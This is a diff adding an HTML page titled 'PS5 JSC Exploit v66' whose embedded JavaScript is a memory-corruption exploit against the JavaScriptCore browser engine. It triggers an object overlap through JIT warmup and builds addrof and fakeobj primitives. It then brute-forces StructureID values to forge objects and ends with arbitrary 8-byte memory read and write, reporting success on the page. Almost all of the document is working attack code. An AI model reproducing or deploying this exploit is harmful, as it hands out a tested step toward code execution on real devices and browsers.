@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PS5 JSC v66</title>
+<style>
+body{background:#0a0a0a;color:#00ff41;font-family:monospace;padding:20px}
+pre{white-space:pre-wrap;word-wrap:break-word}
+</style>
+</head>
+<body>
+<pre id="o"></pre>
+<script>
+var o=document.getElementById("o");
+function p(m){o.textContent+=m+"\n"}
+
+p("=== PS5 JSC Exploit v66 ===\n");
+
+try{
+var arr=new Array(0x40000).fill(1.1);
+var ai=arr.length-1;
+var rc=[];
+
+function foo(f,k,n){
+var A={p0:0x41414141,p1:1.1,p2:2.2};
+arr[ai]=A;
+var gc=[];
+var a=new Date(1111);a[0]=1.1;
+for(var j=0;j<n;++j){gc.push(new ArrayBuffer(0x100000))}
+A.p2=gc;
+var b={p0:0x42424242,p1:1.1};
+var v=1.1;
+if(f){v=1.1}else{v=b}
+A.p1=v;
+var w=1.1;
+for(var i=0;i<100000;++i){for(var j=0;j<k;++j){w=i;w=j}}
+b.p0=w;b.p1=a;
+}
+
+function rec(n){if(n===0)return;n=n|0;rec(n-1)}
+
+p("[*] Warmup...");
+foo(true,1,1);
+foo(false,1,1);
+for(var i=0;i<500;++i)foo(false,0,0);
+for(var i=0;i<1000;i++)rec(i);
+p("[+] Warmup done");
+
+p("[*] Triggering overlap...");
+var win=false;
+var ba,ua;
+
+for(var k=0;k<5000&&!win;++k){
+foo(false,5,k%3+1);
+rec(1000);
+for(var i=0;i<3;++i)new ArrayBuffer(0x4000);
+var fd=arr[ai].p1.p1;
+var nc=13.37;
+for(var i=0;i<16;++i){
+var a2=[13.37,2.2,3.3,4.4,nc];
+rc.push(a2);
+if(fd[0]===13.37){win=true;ba=rc[rc.length-1];ba[0]={};ua=fd;break}
+}
+}
+
+if(!win){p("[-] No overlap");throw 0}
+
+p("[+] OVERLAP FOUND!");
+
+var ab=new ArrayBuffer(8);
+var u64=new BigUint64Array(ab);
+var f64=new Float64Array(ab);
+function i2f(v){u64[0]=v;return f64[0]}
+function f2i(f){f64[0]=f;return u64[0]}
+
+function addrof(obj){ba[0]=obj;return f2i(ua[0])}
+function fakeobj(addr){ua[0]=i2f(addr);return ba[0]}
+
+var t={x:1.1};
+var ta=addrof(t);
+p("[+] addrof(t) = 0x"+ta.toString(16));
+
+p("[*] Spraying for adjacent pair...");
+var sp=[];
+for(var i=0;i<200;++i)sp.push({p1:1.1,p2:2.2});
+
+var oA=null,oAa=0n;
+for(var i=1;i<sp.length;++i){
+var prev=addrof(sp[i-1]);
+var curr=addrof(sp[i]);
+if(curr-prev===0x20n){oA=sp[i-1];oAa=prev;p("[+] Pair at 0x"+oAa.toString(16));break}
+}
+
+if(!oA){p("[-] No pair");throw 0}
+
+var fa=fakeobj(oAa+0x10n);
+
+var kn=[13.37,2.2,3.3,4.4];
+var kna=addrof(kn);
+p("[+] Known array at 0x"+kna.toString(16));
+
+p("[*] Brute forcing StructureID...");
+var fs=false;
+var fc=0n;
+var fo=0n;
+
+var offs=[0x00n,0x08n,0x10n,0x18n,0x20n,0x28n,0x30n];
+
+for(var sid=0;sid<256&&!fs;++sid){
+var cv=BigInt(sid)|0x0024070000000000n;
+try{
+oA.p1=i2f(cv);
+for(var oi=0;oi<offs.length;++oi){
+oA.p2=i2f(kna+offs[oi]);
+try{
+var v=fa[0];
+if(v===13.37){fs=true;fc=cv;fo=offs[oi];p("[+] FOUND SID="+sid+" OFF=0x"+fo.toString(16));break}
+}catch(e2){}
+}
+}catch(e){}
+}
+
+if(!fs){
+p("[*] Trying alternate types...");
+var alts=[0x002403n,0x002406n,0x002408n];
+for(var ti=0;ti<alts.length&&!fs;++ti){
+for(var sid=0;sid<256&&!fs;++sid){
+var cv=BigInt(sid)|(alts[ti]<<32n);
+try{
+oA.p1=i2f(cv);
+for(var oi=0;oi<offs.length;++oi){
+oA.p2=i2f(kna+offs[oi]);
+try{
+var v=fa[0];
+if(typeof v==='number'&&v===13.37){fs=true;fc=cv;fo=offs[oi];p("[+] FOUND T="+ti+" SID="+sid+" OFF=0x"+fo.toString(16));break}
+}catch(e2){}
+}
+}catch(e){}
+}
+}
+}
+
+if(!fs){p("[-] No structure found");throw 0}
+
+oA.p1=i2f(fc);
+
+function read8(addr){oA.p2=i2f(addr);return f2i(fa[0])}
+function write8(addr,val){oA.p2=i2f(addr);fa[0]=i2f(val)}
+
+p("\n[*] Testing read8/write8...");
+var jsc=read8(kna);
+p("[+] read8(kna) = 0x"+jsc.toString(16));
+
+var bp=read8(kna+0x08n);
+p("[+] butterfly = 0x"+bp.toString(16));
+
+var e0=read8(bp);
+p("[+] elem[0] = "+i2f(e0)+" (expect 13.37)");
+
+write8(bp,f2i(99.99));
+p("[+] write8: kn[0] = "+kn[0]+" (expect 99.99)");
+
+p("\n=== SUCCESS! ===");
+p("addrof:  OK");
+p("fakeobj: OK");
+p("read8:   OK");
+p("write8:  OK");
+
+}catch(e){
+p("[-] ERROR: "+e);
+}
+</script>
+</body>
+</html>
